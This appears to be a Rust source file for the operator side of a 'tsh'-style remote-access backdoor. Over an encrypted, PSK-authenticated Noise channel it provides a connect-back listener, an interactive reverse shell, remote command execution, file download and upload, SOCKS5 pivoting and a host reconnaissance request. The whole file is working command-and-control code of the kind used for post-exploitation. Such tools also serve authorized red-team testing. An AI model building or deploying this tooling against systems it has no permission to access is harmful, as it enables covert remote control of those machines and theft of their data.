use crossterm::{
    event::{self, Event},
    terminal::{disable_raw_mode, enable_raw_mode},
};
use indicatif::{ProgressBar, ProgressStyle};
use log::{error, info};
use std::io::{stdout, Write};
use std::path::Path;
use tokio::fs::File;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::{
    constants::*, error::*, helpers::NoiseLayerExt, noise::NoiseLayer, sysinfo::SystemInfo,
    terminal::TerminalHandler,
};

pub async fn handle_connect_back_mode(port: u16, actions: Vec<&str>, psk: &str) -> TshResult<()> {
    info!("🚀 Connect-back mode: waiting for server connection on port {port}");
    info!("🔐 PSK authentication enabled");

    // Create a Noise listener on the client side
    use crate::noise::NoiseListener;

    let listener = NoiseListener::new(&format!("0.0.0.0:{port}"), psk).await?;
    info!("📡 Listening for server connections on port {port}");

    loop {
        info!("⏱️  Waiting for connection...");

        match listener.accept().await {
            Ok(mut layer) => {
                info!("🤝 Server connected and authenticated!");

                // Show remote public key for verification
                if let Some(remote_key) = layer.remote_public_key() {
                    use base64::{engine::general_purpose::STANDARD, Engine};
                    info!("🔑 Remote public key: {}", STANDARD.encode(remote_key));
                }

                info!("✅ PSK authentication successful (via Noise Protocol)");

                // In connect-back mode, server sends the operation mode
                info!("🔍 Waiting for server to specify operation mode...");

                // Read operation modes from server (may receive SysInfo first, then RunShell)
                if let Err(e) = handle_connect_back_operations(&mut layer, &actions).await {
                    error!("Operation failed: {e}");
                }

                break;
            }
            Err(e) => {
                error!("Connection failed: {e}");
                tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
            }
        }
    }

    Ok(())
}

pub async fn handle_direct_connection(
    target: &str,
    port: u16,
    actions: Vec<&str>,
    psk: &str,
) -> TshResult<()> {
    let address = if target.contains(':') {
        target.to_string()
    } else {
        format!("{target}:{port}")
    };

    // SOCKS5 mode: don't open a single connection, run local proxy instead
    if actions.first().map(|a| a.starts_with("socks5")) == Some(true) {
        let bind_addr = parse_socks5_bind(&actions)?;
        return crate::socks5::run_socks5_client(&bind_addr, &address, psk).await;
    }

    info!("🚀 Connecting to {address}...");
    info!("🔐 PSK authentication enabled");

    let mut layer = NoiseLayer::connect(&address, psk).await?;
    info!("📡 Connected to server");

    // Show remote public key for verification
    if let Some(remote_key) = layer.remote_public_key() {
        use base64::{engine::general_purpose::STANDARD, Engine};
        info!("🔑 Remote public key: {}", STANDARD.encode(remote_key));
    }

    // PSK is now handled at the Noise Protocol level
    info!("✅ PSK authentication successful (via Noise Protocol)");

    execute_action(&mut layer, actions).await
}

/// Parse socks5 bind address from action: "socks5" or "socks5:127.0.0.1:1080"
fn parse_socks5_bind(actions: &[&str]) -> TshResult<String> {
    let action_str = actions.join(" ");
    let parts: Vec<&str> = action_str.splitn(2, ':').collect();
    if parts.len() > 1 && !parts[1].is_empty() {
        Ok(parts[1].to_string())
    } else {
        Ok("127.0.0.1:1080".to_string())
    }
}

pub(crate) async fn execute_action(layer: &mut NoiseLayer, actions: Vec<&str>) -> TshResult<()> {
    if actions.is_empty() {
        // Interactive shell mode
        interactive_shell(layer).await
    } else {
        // Parse action
        let action_str = actions.join(" ");
        let parts: Vec<&str> = action_str.split(':').collect();

        match parts.first().copied() {
            Some("sysinfo") => request_sysinfo(layer).await,
            Some("get") if parts.len() == 3 => download_file(layer, parts[1], parts[2]).await,
            Some("put") if parts.len() == 3 => upload_file(layer, parts[1], parts[2]).await,
            Some("cmd") if parts.len() >= 2 => {
                // Command execution mode: cmd:command_to_execute
                let command = parts[1..].join(":");
                execute_command(layer, &command).await
            }
            Some(cmd) => {
                // Single command execution mode
                execute_command(layer, cmd).await
            }
            None => Err(TshError::protocol("Invalid action format")),
        }
    }
}

async fn interactive_shell(layer: &mut NoiseLayer) -> TshResult<()> {
    info!("🐚 Starting enhanced interactive shell... Press Ctrl+C to exit");

    // Send mode byte in a single message
    layer.write_all(&[OperationMode::RunShell as u8]).await?;

    // Enable raw mode for terminal
    enable_raw_mode().map_err(|e| TshError::Io(std::io::Error::other(e)))?;

    let result = enhanced_shell_loop(layer).await;

    // Restore terminal
    let _ = disable_raw_mode();

    result
}

async fn enhanced_shell_loop(layer: &mut NoiseLayer) -> TshResult<()> {
    let mut terminal = TerminalHandler::new()?;

    // Display initial prompt
    terminal.display_prompt()?;

    loop {
        tokio::select! {
            // Read from server
            server_data = read_server_data(layer) => {
                match server_data {
                    Ok(data) => {
                        if data.is_empty() {
                            info!("🔚 Server disconnected");
                            break;
                        }
                        terminal.handle_server_data(&data)?;
                        terminal.display_prompt()?;
                    }
                    Err(e) => {
                        error!("Server read error: {e}");
                        break;
                    }
                }
            }

            // Read from user input
            user_input = read_enhanced_user_input(&mut terminal) => {
                match user_input {
                    Ok(Some(data)) => {
                        if let Err(e) = layer.write_all(&data).await {
                            error!("Failed to send to server: {e}");
                            break;
                        }
                    }
                    Ok(None) => {
                        info!("👋 Exiting...");
                        break;
                    }
                    Err(e) => {
                        error!("Input error: {e}");
                        break;
                    }
                }
            }
        }
    }

    Ok(())
}

async fn read_server_data(layer: &mut NoiseLayer) -> TshResult<Vec<u8>> {
    let mut buf = vec![0u8; 8192];
    let n = layer.read(&mut buf).await?;
    buf.truncate(n);
    Ok(buf)
}

async fn read_enhanced_user_input(terminal: &mut TerminalHandler) -> TshResult<Option<Vec<u8>>> {
    if event::poll(tokio::time::Duration::from_millis(10))
        .map_err(|e| TshError::Io(std::io::Error::other(e)))?
    {
        match event::read().map_err(|e| TshError::Io(std::io::Error::other(e)))? {
            Event::Key(key_event) => terminal.handle_key_event(key_event).await,
            Event::Resize(_, _) => {
                terminal.handle_resize()?;
                Ok(Some(vec![]))
            }
            _ => Ok(Some(vec![])),
        }
    } else {
        tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
        Ok(Some(vec![]))
    }
}

async fn download_file(
    layer: &mut NoiseLayer,
    remote_path: &str,
    local_dir: &str,
) -> TshResult<()> {
    info!("📥 Downloading {remote_path} to {local_dir}");

    // Send mode and file path in a single message
    let mut data = Vec::new();
    data.push(OperationMode::GetFile as u8);
    data.extend_from_slice(remote_path.as_bytes());
    data.push(0); // null terminator
    layer.write_all(&data).await?;

    // Read file size
    let mut size_buf = [0u8; 8];
    layer.read_exact(&mut size_buf).await?;
    let file_size = u64::from_be_bytes(size_buf);

    if file_size == 0 {
        return Err(TshError::protocol(format!("File not found: {remote_path}")));
    }

    info!("📊 File size: {file_size} bytes");

    // Create local file
    let remote_filename = Path::new(remote_path)
        .file_name()
        .unwrap_or(std::ffi::OsStr::new("downloaded_file"))
        .to_string_lossy();
    let local_path = Path::new(local_dir).join(remote_filename.as_ref());
    let mut local_file = File::create(&local_path).await?;

    // Create progress bar
    let pb = ProgressBar::new(file_size);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("[{elapsed_precise}] {bar:40.cyan/blue} {bytes}/{total_bytes} ({bytes_per_sec}, {eta})")
            .unwrap()
            .progress_chars("#>-"),
    );

    // Download file with progress
    let mut downloaded = 0u64;
    let mut buffer = vec![0u8; 8192];

    while downloaded < file_size {
        let to_read = std::cmp::min(buffer.len(), (file_size - downloaded) as usize);
        let n = layer.read(&mut buffer[..to_read]).await?;

        if n == 0 {
            break;
        }

        local_file.write_all(&buffer[..n]).await?;
        downloaded += n as u64;
        pb.set_position(downloaded);
    }

    pb.finish_with_message("✅ Download complete");
    info!("📁 File downloaded to: {}", local_path.display());
    Ok(())
}

async fn upload_file(layer: &mut NoiseLayer, local_path: &str, remote_dir: &str) -> TshResult<()> {
    info!("📤 Uploading {local_path} to {remote_dir}");

    let mut local_file = File::open(local_path).await?;
    let file_size = local_file.metadata().await?.len();

    let filename = Path::new(local_path)
        .file_name()
        .unwrap_or(std::ffi::OsStr::new("uploaded_file"))
        .to_string_lossy();
    let remote_path = format!("{remote_dir}/{filename}");

    info!("📊 File size: {file_size} bytes");

    // Send mode, remote path, and file size in a single message
    let mut data = Vec::new();
    data.push(OperationMode::PutFile as u8);
    data.extend_from_slice(remote_path.as_bytes());
    data.push(0); // null terminator
    layer.write_all(&data).await?;

    // Send file size separately
    layer.write_all(&file_size.to_be_bytes()).await?;

    // Create progress bar
    let pb = ProgressBar::new(file_size);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("[{elapsed_precise}] {bar:40.cyan/blue} {bytes}/{total_bytes} ({bytes_per_sec}, {eta})")
            .unwrap()
            .progress_chars("#>-"),
    );

    // Upload file with progress
    let mut uploaded = 0u64;
    let mut buffer = vec![0u8; 8192];

    while uploaded < file_size {
        let n = local_file.read(&mut buffer).await?;
        if n == 0 {
            break;
        }

        layer.write_all(&buffer[..n]).await?;
        uploaded += n as u64;
        pb.set_position(uploaded);
    }

    pb.finish_with_message("✅ Upload complete");
    info!("📁 File uploaded to: {remote_path}");
    Ok(())
}

async fn handle_reverse_shell_client(layer: &mut NoiseLayer) -> TshResult<()> {
    info!("🐚 Starting reverse shell client mode... Press Ctrl+C to exit");

    // Enable raw mode for terminal
    enable_raw_mode().map_err(|e| TshError::Io(std::io::Error::other(e)))?;

    let result = enhanced_shell_loop(layer).await;

    // Restore terminal
    let _ = disable_raw_mode();

    result
}

async fn handle_connect_back_operations(layer: &mut NoiseLayer, actions: &[&str]) -> TshResult<()> {
    loop {
        let mut buf = vec![0u8; 8192];
        let n = layer.read(&mut buf).await?;
        if n == 0 {
            return Err(TshError::protocol(
                "Server disconnected before sending operation mode",
            ));
        }

        let mode = OperationMode::try_from(buf[0]).map_err(TshError::InvalidOperationMode)?;
        info!("🎯 Server requested operation: {mode:?}");

        match mode {
            OperationMode::SysInfo => {
                // Parse and display system info from the remaining bytes
                if n > 1 {
                    display_sysinfo(&buf[1..n]);
                }
                // Continue reading next operation mode
                continue;
            }
            OperationMode::RunShell => {
                info!("🐚 Starting reverse shell as requested by server");
                return handle_reverse_shell_client(layer).await;
            }
            _ => {
                if actions.is_empty() {
                    return Err(TshError::protocol("No action specified"));
                }
                return execute_action(layer, actions.to_vec()).await;
            }
        }
    }
}

async fn request_sysinfo(layer: &mut NoiseLayer) -> TshResult<()> {
    info!("Requesting system info from server");
    layer.write_all(&[OperationMode::SysInfo as u8]).await?;

    let mut buf = vec![0u8; 8192];
    let n = layer.read(&mut buf).await?;
    if n == 0 {
        return Err(TshError::protocol("No response from server"));
    }

    // Server responds with SysInfo mode byte + JSON
    if buf[0] == OperationMode::SysInfo as u8 && n > 1 {
        display_sysinfo(&buf[1..n]);
    } else {
        display_sysinfo(&buf[..n]);
    }

    Ok(())
}

fn display_sysinfo(json_bytes: &[u8]) {
    match SystemInfo::from_json_bytes(json_bytes) {
        // Intentional: displaying agent system info (hostname, user, etc.) to the
        // operator is the core purpose of this reconnaissance feature.
        Some(info) => print!("{}", info.display()), // lgtm[rust/log-sensitive-data]
        None => error!("Failed to parse system info"),
    }
}

async fn execute_command(layer: &mut NoiseLayer, command: &str) -> TshResult<()> {
    info!("⚡ Executing command: {command}");

    // Send command mode and the command in a single message
    let mut data = Vec::new();
    data.push(OperationMode::RunCommand as u8);
    data.extend_from_slice(command.as_bytes());
    data.push(0); // null terminator
    layer.write_all(&data).await?;

    // Read exit code
    let mut exit_code_buf = [0u8; 1];
    layer.read_exact(&mut exit_code_buf).await?;
    let exit_code = exit_code_buf[0];

    // Read stdout length and data
    let mut stdout_len_buf = [0u8; 4];
    layer.read_exact(&mut stdout_len_buf).await?;
    let stdout_len = u32::from_be_bytes(stdout_len_buf) as usize;

    if stdout_len > 0 {
        let mut stdout_data = vec![0u8; stdout_len];
        layer.read_exact(&mut stdout_data).await?;
        print!("{}", String::from_utf8_lossy(&stdout_data));
    }

    // Read stderr length and data
    let mut stderr_len_buf = [0u8; 4];
    layer.read_exact(&mut stderr_len_buf).await?;
    let stderr_len = u32::from_be_bytes(stderr_len_buf) as usize;

    if stderr_len > 0 {
        let mut stderr_data = vec![0u8; stderr_len];
        layer.read_exact(&mut stderr_data).await?;
        eprint!("{}", String::from_utf8_lossy(&stderr_data));
    }

    let _ = stdout().flush();

    if exit_code != 0 {
        info!("⚠️  Command exited with code: {exit_code}");
    } else {
        info!("✅ Command executed successfully");
    }

    Ok(())
}
